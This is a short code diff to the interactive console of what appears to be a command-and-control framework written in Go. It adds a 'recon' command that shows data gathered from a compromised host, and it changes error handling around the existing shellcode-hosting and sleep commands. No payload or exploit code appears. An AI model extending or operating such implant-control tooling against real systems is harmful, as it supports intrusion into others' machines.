@@ -32,7 +32,8 @@ func Interact(ip string) error {
 			}
 			err = http.HostShellcode(path, ip)
 			if err != nil {
-				return err
+				util.ErrPrint(err)
+				break
 			}
 		case "sleep":
 			if len(input) != 2 {
@@ -45,6 +46,9 @@ func Interact(ip string) error {
 				break
 			}
 			http.HostSleep(time, ip)
+		case "recon":
+			initChecks := http.M[ip].GetInitChecks()
+			util.PrintRecon(initChecks)
 		}
 	}
 	return nil
@@ -56,6 +60,7 @@ func completer(d prompt.Document) []prompt.Suggest {
 		{Text: "back", Description: "Go back to the main menu"},
 		{Text: "shellcode", Description: "Host shellcode"},
 		{Text: "sleep", Description: "Set sleep time"},
+		{Text: "recon", Description: "Show recon information"},
 	}
 	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
 }
